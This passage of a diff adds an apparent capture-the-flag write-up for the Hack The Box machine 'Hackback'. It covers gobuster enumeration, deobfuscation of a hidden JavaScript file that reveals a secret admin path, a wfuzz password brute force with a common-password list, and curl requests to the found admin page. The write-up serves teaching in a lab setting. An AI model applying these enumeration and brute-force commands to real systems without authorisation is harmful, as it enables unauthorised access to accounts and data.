+        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- PASSWORD INPUT --&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter Password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Log In&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lost&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Lost your Password?&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;signup&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Don't have An account?&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;we-notice-this-weird-comment-----script-srcjsjsscript---&quot;&gt;We notice this weird comment : &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;!-- &amp;lt;script SRC=&quot;js/.js&quot;&amp;gt;&amp;lt;/script&amp;gt; --&amp;gt;&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;however-js-gave-a-403-&quot;&gt;However &lt;code class=&quot;highlighter-rouge&quot;&gt;/js&lt;/code&gt; gave a &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-ran-gobuster-with-usrsharewordlistsdirbcommontxt-and-js-extension-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wordlists/dirb/common.txt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;.js&lt;/code&gt; extension :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# gobuster -u http://admin.hackback.htb/js/ -w /usr/share/wordlists/dirb/common.txt -x js
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://admin.hackback.htb/js/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Extensions   : js
+[+] Timeout      : 10s
+=====================================================
+2019/07/05 09:37:16 Starting gobuster
+=====================================================
+/private.js (Status: 200)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;script-deobfuscation&quot;&gt;Script Deobfuscation&lt;/h3&gt;
+&lt;h4 id=&quot;by-looking-at-privatejs-its-not-really-what-we-expect-a-javascript-file-to-be-&quot;&gt;By looking at &lt;code class=&quot;highlighter-rouge&quot;&gt;private.js&lt;/code&gt; it’s not really what we expect a javascript file to be :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
+	ine n=['\k57\k78\k49\k6n\k77\k72\k37\k44\k75\k73\k4s\k38\k47\k73\k4o\k76\k52\k77\k42\k2o\k77\k71\k33\k44\k75\k4q\k4o\k72\k77\k72\k4p\k44\k67\k63\k4s\k69\k77\k72\k59\k31\k4o\k45\k45\k67\k47\k38\k4o\k43\k77\k71\k37\k44\k6p\k38\k4o\k33','\k41\k63\k4s\k4q\k77\k71\k76\k44\k71\k51\k67\k43\k77\k34\k2s\k43\k74\k32\k6r\k44\k74\k4q\k4o\k68\k5n\k63\k4o\k44\k77\k71\k54\k43\k70\k54\k73\k79\k77\k37\k6r\k43\k68\k73\k4s\k51\k58\k4q\k4s\k35\k57\k38\k4o\k70\k44\k73\k4s\k74\k4r\k43\k44\k44\k76\k41\k6n\k43\k67\k79\k6o\k3q','\k77\k35\k48\k44\k72\k38\k4s\k37\k64\k44\k52\k6q\k4q\k4q\k4o\k4n\k77\k34\k6n\k44\k6p\k56\k52\k6r\k77\k72\k74\k37\k77\k37\k73\k30\k77\k6s\k31\k61\k77\k37\k73\k41\k51\k73\k4o\k73\k66\k73\k4s\k45\k77\k34\k58\k44\k73\k52\k6n\k43\k6p\k4q\k4s\k77\k46\k7n\k72\k43\k6q\k7n\k70\k76\k43\k41\k6n\k43\k75\k42\k7n\k44\k73\k73\k4o\k39\k46\k38\k4s\k34\k77\k71\k5n\k6r\k57\k73\k4o\k68'];(shapgvba(p,q){ine r=shapgvba(s){juvyr(--s){p['chfu'](p['fuvsg']());}};r(++q);}(n,0k66));ine o=shapgvba(p,q){p=p-0k0;ine r=n[p];vs(o['ZfHYzi']===haqrsvarq){(shapgvba(){ine s;gel{ine t=Shapgvba('erghea\k20(shapgvba()\k20'+'{}.pbafgehpgbe(\k22erghea\k20guvf\k22)(\k20)'+');');s=t();}pngpu(u){s=jvaqbj;}ine v='NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789+/=';s['ngbo']||(s['ngbo']=shapgvba(w){ine x=Fgevat(w)['ercynpr'](/=+$/,'');sbe(ine y=0k0,z,a,b=0k0,c='';a=x['puneNg'](b++);~a&amp;amp;&amp;amp;(z=y%0k4?z*0k40+a:a,y++%0k4)?c+=Fgevat['sebzPunePbqr'](0kss&amp;amp;z&amp;gt;&amp;gt;(-0k2*y&amp;amp;0k6)):0k0){a=v['vaqrkBs'](a);}erghea c;});}());ine d=shapgvba(e,q){ine g=[],h=0k0,i,j='',k='';e=ngbo(e);sbe(ine l=0k0,m=e['yratgu'];l&amp;lt;m;l++){k+='%'+('00'+e['punePbqrNg'](l)['gbFgevat'](0k10))['fyvpr'](-0k2);}e=qrpbqrHEVPbzcbarag(k);sbe(ine N=0k0;N&amp;lt;0k100;N++){g[N]=N;}sbe(N=0k0;N&amp;lt;0k100;N++){h=(h+g[N]+q['punePbqrNg'](N%q['yratgu']))%0k100;i=g[N];g[N]=g[h];g[h]=i;}N=0k0;h=0k0;sbe(ine O=0k0;O&amp;lt;e['yratgu'];O++){N=(N+0k1)%0k100;h=(h+g[N])%0k100;i=g[N];g[N]=g[h];g[h]=i;j+=Fgevat['sebzPunePbqr'](e['punePbqrNg'](O)^g[(g[N]+g[h])%0k100]);}erghea j;};o['BbNPpq']=d;o['dFYjTx']={};o['ZfHYzi']=!![];}ine P=o['dFYjTx'][p];vs(P===haqrsvarq){vs(o['cVwyDO']===haqrsvarq){o['cVwyDO']=!![];}r=o['BbNPpq'](r,q);o['dFYjTx'][p]=r;}ryfr{r=P;}erghea r;};ine k='\k53\k65\k63\k75\k72\k65\k20\k4p\k6s\k67\k69\k6r\k20\k42\k79\k70\k61\k73\k73';ine m=o('0k0','\k50\k5q\k53\k36');ine u=o('0k1','\k72\k37\k54\k59');ine l=o('0k2','\k44\k41\k71\k67');ine g='\k3s\k61\k63\k74\k69\k6s\k6r\k3q\k28\k73\k68\k6s\k77\k2p\k6p\k69\k73\k74\k2p\k65\k78\k65\k63\k2p\k69\k6r\k69\k74\k29';ine f='\k26\k73\k69\k74\k65\k3q\k28\k74\k77\k69\k74\k74\k65\k72\k2p\k70\k61\k79\k70\k61\k6p\k2p\k66\k61\k63\k65\k62\k6s\k6s\k6o\k2p\k68\k61\k63\k6o\k74\k68\k65\k62\k6s\k78\k29';ine v='\k26\k70\k61\k73\k73\k77\k6s\k72\k64\k3q\k2n\k2n\k2n\k2n\k2n\k2n\k2n\k2n';ine x='\k26\k73\k65\k73\k73\k69\k6s\k6r\k3q';ine j='\k4r\k6s\k74\k68\k69\k6r\k67\k20\k6q\k6s\k72\k65\k20\k74\k6s\k20\k73\k61\k79';
+&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;first-thing-we-notice-is-that-its-not-actually-js-ine-n--this-doesnt-look-like-js-most-likely-its-gonna-be-var-v-is-the-22nd-letter-in-alphabet-while-i-is-the-9th-22---9--13&quot;&gt;First thing we notice is that it’s not actually &lt;code class=&quot;highlighter-rouge&quot;&gt;js&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;ine n&lt;/code&gt; ? This doesn’t look like &lt;code class=&quot;highlighter-rouge&quot;&gt;js&lt;/code&gt;, most likely it’s gonna be &lt;code class=&quot;highlighter-rouge&quot;&gt;var&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;v&lt;/code&gt; is the 22nd letter in alphabet while &lt;code class=&quot;highlighter-rouge&quot;&gt;i&lt;/code&gt; is the 9th. &lt;code class=&quot;highlighter-rouge&quot;&gt;22 - 9 = 13&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;so-this-script-is-rot-13-encoded-i-used-rot13com-to-decode-it-&quot;&gt;So this script is &lt;code class=&quot;highlighter-rouge&quot;&gt;rot 13&lt;/code&gt; encoded. I used &lt;a href=&quot;https://www.rot13.com&quot;&gt;rot13.com&lt;/a&gt; to decode it :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var a=['\x57\x78\x49\x6a\x77\x72\x37\x44\x75\x73\x4f\x38\x47\x73\x4b\x76\x52\x77\x42\x2b\x77\x71\x33\x44\x75\x4d\x4b\x72\x77\x72\x4c\x44\x67\x63\x4f\x69\x77\x72\x59\x31\x4b\x45\x45\x67\x47\x38\x4b\x43\x77\x71\x37\x44\x6c\x38\x4b\x33','\x41\x63\x4f\x4d\x77\x71\x76\x44\x71\x51\x67\x43\x77\x34\x2f\x43\x74\x32\x6e\x44\x74\x4d\x4b\x68\x5a\x63\x4b\x44\x77\x71\x54\x43\x70\x54\x73\x79\x77\x37\x6e\x43\x68\x73\x4f\x51\x58\x4d\x4f\x35\x57\x38\x4b\x70\x44\x73\x4f\x74\x4e\x43\x44\x44\x76\x41\x6a\x43\x67\x79\x6b\x3d','\x77\x35\x48\x44\x72\x38\x4f\x37\x64\x44\x52\x6d\x4d\x4d\x4b\x4a\x77\x34\x6a\x44\x6c\x56\x52\x6e\x77\x72\x74\x37\x77\x37\x73\x30\x77\x6f\x31\x61\x77\x37\x73\x41\x51\x73\x4b\x73\x66\x73\x4f\x45\x77\x34\x58\x44\x73\x52\x6a\x43\x6c\x4d\x4f\x77\x46\x7a\x72\x43\x6d\x7a\x70\x76\x43\x41\x6a\x43\x75\x42\x7a\x44\x73\x73\x4b\x39\x46\x38\x4f\x34\x77\x71\x5a\x6e\x57\x73\x4b\x68'];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};e(++d);}(a,0x66));var b=function(c,d){c=c-0x0;var e=a[c];if(b['MsULmv']===undefined){(function(){var f;try{var g=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');f=g();}catch(h){f=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';f['atob']||(f['atob']=function(j){var k=String(j)['replace'](/=+$/,'');for(var l=0x0,m,n,o=0x0,p='';n=k['charAt'](o++);~n&amp;amp;&amp;amp;(m=l%0x4?m*0x40+n:n,l++%0x4)?p+=String['fromCharCode'](0xff&amp;amp;m&amp;gt;&amp;gt;(-0x2*l&amp;amp;0x6)):0x0){n=i['indexOf'](n);}return p;});}());var q=function(r,d){var t=[],u=0x0,v,w='',x='';r=atob(r);for(var y=0x0,z=r['length'];y&amp;lt;z;y++){x+='%'+('00'+r['charCodeAt'](y)['toString'](0x10))['slice'](-0x2);}r=decodeURIComponent(x);for(var A=0x0;A&amp;lt;0x100;A++){t[A]=A;}for(A=0x0;A&amp;lt;0x100;A++){u=(u+t[A]+d['charCodeAt'](A%d['length']))%0x100;v=t[A];t[A]=t[u];t[u]=v;}A=0x0;u=0x0;for(var B=0x0;B&amp;lt;r['length'];B++){A=(A+0x1)%0x100;u=(u+t[A])%0x100;v=t[A];t[A]=t[u];t[u]=v;w+=String['fromCharCode'](r['charCodeAt'](B)^t[(t[A]+t[u])%0x100]);}return w;};b['OoACcd']=q;b['qSLwGk']={};b['MsULmv']=!![];}var C=b['qSLwGk'][c];if(C===undefined){if(b['pIjlQB']===undefined){b['pIjlQB']=!![];}e=b['OoACcd'](e,d);b['qSLwGk'][c]=e;}else{e=C;}return e;};var x='\x53\x65\x63\x75\x72\x65\x20\x4c\x6f\x67\x69\x6e\x20\x42\x79\x70\x61\x73\x73';var z=b('0x0','\x50\x5d\x53\x36');var h=b('0x1','\x72\x37\x54\x59');var y=b('0x2','\x44\x41\x71\x67');var t='\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x28\x73\x68\x6f\x77\x2c\x6c\x69\x73\x74\x2c\x65\x78\x65\x63\x2c\x69\x6e\x69\x74\x29';var s='\x26\x73\x69\x74\x65\x3d\x28\x74\x77\x69\x74\x74\x65\x72\x2c\x70\x61\x79\x70\x61\x6c\x2c\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2c\x68\x61\x63\x6b\x74\x68\x65\x62\x6f\x78\x29';var i='\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x3d\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a';var k='\x26\x73\x65\x73\x73\x69\x6f\x6e\x3d';var w='\x4e\x6f\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20\x74\x6f\x20\x73\x61\x79';
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;now-this-is-better-i-also-used-a-js-beautifier-to-make-it-easily-readable-&quot;&gt;Now this is better. I also used a &lt;code class=&quot;highlighter-rouge&quot;&gt;js&lt;/code&gt; beautifier to make it easily readable :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var a = ['\x57\x78\x49\x6a\x77\x72\x37\x44\x75\x73\x4f\x38\x47\x73\x4b\x76\x52\x77\x42\x2b\x77\x71\x33\x44\x75\x4d\x4b\x72\x77\x72\x4c\x44\x67\x63\x4f\x69\x77\x72\x59\x31\x4b\x45\x45\x67\x47\x38\x4b\x43\x77\x71\x37\x44\x6c\x38\x4b\x33', '\x41\x63\x4f\x4d\x77\x71\x76\x44\x71\x51\x67\x43\x77\x34\x2f\x43\x74\x32\x6e\x44\x74\x4d\x4b\x68\x5a\x63\x4b\x44\x77\x71\x54\x43\x70\x54\x73\x79\x77\x37\x6e\x43\x68\x73\x4f\x51\x58\x4d\x4f\x35\x57\x38\x4b\x70\x44\x73\x4f\x74\x4e\x43\x44\x44\x76\x41\x6a\x43\x67\x79\x6b\x3d', '\x77\x35\x48\x44\x72\x38\x4f\x37\x64\x44\x52\x6d\x4d\x4d\x4b\x4a\x77\x34\x6a\x44\x6c\x56\x52\x6e\x77\x72\x74\x37\x77\x37\x73\x30\x77\x6f\x31\x61\x77\x37\x73\x41\x51\x73\x4b\x73\x66\x73\x4f\x45\x77\x34\x58\x44\x73\x52\x6a\x43\x6c\x4d\x4f\x77\x46\x7a\x72\x43\x6d\x7a\x70\x76\x43\x41\x6a\x43\x75\x42\x7a\x44\x73\x73\x4b\x39\x46\x38\x4f\x34\x77\x71\x5a\x6e\x57\x73\x4b\x68'];
+(function(c, d) {
+    var e = function(f) {
+        while (--f) {
+            c['push'](c['shift']());
+        }
+    };
+    e(++d);
+}(a, 0x66));
+var b = function(c, d) {
+    c = c - 0x0;
+    var e = a[c];
+    if (b['MsULmv'] === undefined) {
+        (function() {
+            var f;
+            try {
+                var g = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');');
+                f = g();
+            } catch (h) {
+                f = window;
+            }
+            var i = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+            f['atob'] || (f['atob'] = function(j) {
+                var k = String(j)['replace'](/=+$/, '');
+                for (var l = 0x0, m, n, o = 0x0, p = ''; n = k['charAt'](o++); ~n &amp;amp;&amp;amp; (m = l % 0x4 ? m * 0x40 + n : n, l++ % 0x4) ? p += String['fromCharCode'](0xff &amp;amp; m &amp;gt;&amp;gt; (-0x2 * l &amp;amp; 0x6)) : 0x0) {
+                    n = i['indexOf'](n);
+                }
+                return p;
+            });
+        }());
+        var q = function(r, d) {
+            var t = [],
+                u = 0x0,
+                v, w = '',
+                x = '';
+            r = atob(r);
+            for (var y = 0x0, z = r['length']; y &amp;lt; z; y++) {
+                x += '%' + ('00' + r['charCodeAt'](y)['toString'](0x10))['slice'](-0x2);
+            }
+            r = decodeURIComponent(x);
+            for (var A = 0x0; A &amp;lt; 0x100; A++) {
+                t[A] = A;
+            }
+            for (A = 0x0; A &amp;lt; 0x100; A++) {
+                u = (u + t[A] + d['charCodeAt'](A % d['length'])) % 0x100;
+                v = t[A];
+                t[A] = t[u];
+                t[u] = v;
+            }
+            A = 0x0;
+            u = 0x0;
+            for (var B = 0x0; B &amp;lt; r['length']; B++) {
+                A = (A + 0x1) % 0x100;
+                u = (u + t[A]) % 0x100;
+                v = t[A];
+                t[A] = t[u];
+                t[u] = v;
+                w += String['fromCharCode'](r['charCodeAt'](B) ^ t[(t[A] + t[u]) % 0x100]);
+            }
+            return w;
+        };
+        b['OoACcd'] = q;
+        b['qSLwGk'] = {};
+        b['MsULmv'] = !![];
+    }
+    var C = b['qSLwGk'][c];
+    if (C === undefined) {
+        if (b['pIjlQB'] === undefined) {
+            b['pIjlQB'] = !![];
+        }
+        e = b['OoACcd'](e, d);
+        b['qSLwGk'][c] = e;
+    } else {
+        e = C;
+    }
+    return e;
+};
+var x = '\x53\x65\x63\x75\x72\x65\x20\x4c\x6f\x67\x69\x6e\x20\x42\x79\x70\x61\x73\x73';
+var z = b('0x0', '\x50\x5d\x53\x36');
+var h = b('0x1', '\x72\x37\x54\x59');
+var y = b('0x2', '\x44\x41\x71\x67');
+var t = '\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x28\x73\x68\x6f\x77\x2c\x6c\x69\x73\x74\x2c\x65\x78\x65\x63\x2c\x69\x6e\x69\x74\x29';
+var s = '\x26\x73\x69\x74\x65\x3d\x28\x74\x77\x69\x74\x74\x65\x72\x2c\x70\x61\x79\x70\x61\x6c\x2c\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2c\x68\x61\x63\x6b\x74\x68\x65\x62\x6f\x78\x29';
+var i = '\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x3d\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a';
+var k = '\x26\x73\x65\x73\x73\x69\x6f\x6e\x3d';
+var w = '\x4e\x6f\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20\x74\x6f\x20\x73\x61\x79';
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;as-you-can-see-its-still-heavily-obfuscated-i-solved-this-by-pasting-the-code-in-the-js-console-it-will-do-the-magic-happening-in-these-functions-then-we-can-just-read-the-variables-at-the-bottom-of-the-script--x-z-h-y-t-s-i-k-w&quot;&gt;As you can see it’s still heavily obfuscated, I solved this by pasting the code in the &lt;code class=&quot;highlighter-rouge&quot;&gt;js&lt;/code&gt; console. It will do the magic happening in these functions then we can just read the variables at the bottom of the script : &lt;code class=&quot;highlighter-rouge&quot;&gt;x z h y t s i k w&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-got-this-message-&quot;&gt;We got this message :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Secure Login Bypass
+Remember the secret path is
+2bb6916122f1da34dcd916421e531578
+Just in case I loose access to the admin panel
+?action=(show,list,exec,init)
+&amp;amp;site=(twitter,paypal,facebook,hackthebox)
+&amp;amp;password=&amp;lt;hr&amp;gt;**
+&amp;amp;session=
+Nothing more to say
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;going-to-that-path-only-caused-a-redirect-so-we-need-to-enumerate-more&quot;&gt;Going to that path only caused a redirect, so we need to enumerate more.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;accessing-the-secret-path&quot;&gt;Accessing the Secret Path&lt;/h3&gt;
+&lt;h4 id=&quot;from-the-secret-message-we-know-what-parameters-its-expecting-us-to-send--actionsitepasswordsession-this-is-probably-gonna-be-a-php-page-so-i-ran-gobuster-on-that-path-with-the-same-wordlist-i-used-before-and-php-extension-&quot;&gt;From the secret message we know what parameters it’s expecting us to send : (&lt;code class=&quot;highlighter-rouge&quot;&gt;?action=&amp;amp;site=&amp;amp;password=&amp;amp;session=&lt;/code&gt;). This is probably gonna be a &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; page. So I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; on that path with the same wordlist I used before and &lt;code class=&quot;highlighter-rouge&quot;&gt;.php&lt;/code&gt; extension :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# gobuster -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/ -w /usr/share/wordlists/dirb/common.txt -x php
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Extensions   : php
+[+] Timeout      : 10s
+=====================================================
+2019/07/05 10:08:09 Starting gobuster
+=====================================================
+/webadmin.php (Status: 302)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;great-we-got-webadminphp-i-tried-again-and-now-i-didnt-get-a-redirect-&quot;&gt;Great we got &lt;code class=&quot;highlighter-rouge&quot;&gt;webadmin.php&lt;/code&gt;, I tried again and now I didn’t get a redirect :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;amp;site=hackthebox&amp;amp;password=test&amp;amp;session='
+Wrong secret key!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;but-i-got-wrong-secret-key-and-thats-expected-because-i-set-the-password-to-test-i-used-wfuzz-again-with-darkweb2017-top10000txt-from-seclists-to-bruteforce-the-password-which-happened-to-be-a-very-easy-one-&quot;&gt;But I got &lt;code class=&quot;highlighter-rouge&quot;&gt;Wrong secret key!&lt;/code&gt;, and that’s expected because I set the password to &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt;. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; again with &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt&quot;&gt;darkweb2017-top10000.txt&lt;/a&gt; from &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;seclists&lt;/a&gt; to bruteforce the password which happened to be a very easy one :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# wfuzz -u 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;amp;site=hackthebox&amp;amp;password=FUZZ&amp;amp;session=' -w darkweb2017-top10000.txt 
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+*****
+* Wfuzz 2.3.4 - The Web Fuzzer                         *
+*****
+
+Target: http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;amp;site=hackthebox&amp;amp;password=FUZZ&amp;amp;session=
+Total requests: 10000
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload
+==================================================================
+
+000001:  C=302      0 L        3 W           17 Ch        &quot;123456&quot;
+000004:  C=302      0 L        3 W           17 Ch        &quot;password&quot;
+000006:  C=302      0 L        3 W           17 Ch        &quot;abc123&quot;
+000005:  C=302      0 L        3 W           17 Ch        &quot;qwerty&quot;
+000007:  C=302      7 L       15 W          197 Ch        &quot;12345678&quot;
+000008:  C=302      0 L        3 W           17 Ch        &quot;password1&quot;
+000009:  C=302      0 L        3 W           17 Ch        &quot;1234567&quot;
+000010:  C=302      0 L        3 W           17 Ch        &quot;123123&quot;
+000002:  C=302      0 L        3 W           17 Ch        &quot;123456789&quot;
+000003:  C=302      0 L        3 W           17 Ch        &quot;111111&quot;
+000011:  C=302      0 L        3 W           17 Ch        &quot;1234567890&quot;
+000012:  C=302      0 L        3 W           17 Ch        &quot;000000&quot;
+000013:  C=302      0 L        3 W           17 Ch        &quot;12345&quot;
+^C
+Finishing pending requests...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;12345678-gave-a-different-response-length-so-its-probably-the-password-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;12345678&lt;/code&gt; gave a different response length so it’s probably the password :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;amp;site=hackthebox&amp;amp;password=12345678&amp;amp;session='
+Array
+(
+    [0] =&amp;gt; .
+    [1] =&amp;gt; ..
+    [2] =&amp;gt; 7cb114055494cb503306a0edd1ad1d398f6fb18e28a7a62883c24fd8ab34f66b.log
+    [3] =&amp;gt; e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log
+)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
